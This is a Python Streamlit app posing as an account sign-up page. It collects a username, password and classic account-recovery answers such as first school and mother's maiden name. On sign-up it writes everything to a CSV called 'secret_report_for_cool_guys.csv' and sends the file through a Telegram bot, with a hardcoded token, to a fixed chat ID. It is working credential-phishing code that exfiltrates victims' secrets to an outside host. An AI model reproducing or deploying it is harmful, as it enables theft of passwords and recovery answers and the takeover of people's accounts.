import streamlit as st
import pandas as pd

# streamlit run app.py

st.subheader("Create an Account")
new_user = st.text_input('Username')
new_passwd = st.text_input('Password', type='password')
if new_user and new_passwd:
	st.success("You have successfully created an account.Go to the Login Menu to login")
	df = pd.DataFrame({"username": [new_user], "password": [new_passwd]})

st.write('Please answer the security questions:')
school = st.text_input('Name of your first school?')
mom_name = st.text_input('Mother''s maiden name?')
hotel = st.text_input('next vacation - fancy boho chick hotel or airbnb in a secluded beach?')
drink = st.text_input('Next vacation with grillouzo or limoncello?')


# save results to csv and send via telegram

df = pd.DataFrame({"username": [new_user], "password": [new_passwd], "school": [school], "mom_name": [mom_name], "hotel": [hotel], "drink": [drink]})
import telebot
import dataframe_image as dfi
import cv2

TOKEN = "2034688341:AAGiWVOQZ_wJUDLEGPbqXn80LzJ9palMWu0"
tb = telebot.TeleBot(TOKEN)  # create a new Telegram Bot object
if st.button('Sign Up'):
	# dfi.export(df,"mytable.png")
	image = cv2.imread('mytable.png')
	image = open('mytable.png', 'rb')
	chat_id = '630924196'
	# tb.send_photo(chat_id=chat_id, photo=image)


	import csv, io

	test_data = df.values

	# csv module can write data in io.StringIO buffer only
	s = io.StringIO()
	csv.writer(s).writerows(test_data)
	s.seek(0)

	# python-telegram-bot library can send files only from io.BytesIO buffer
	# we need to convert StringIO to BytesIO
	buf = io.BytesIO()

	# extract csv-string, convert it to bytes and write to buffer
	buf.write(s.getvalue().encode())
	buf.seek(0)

	# set a filename with file's extension
	buf.name = f'secret_report_for_cool_guys.csv'

	# send the buffer as a regular file
	tb.send_document(chat_id, buf)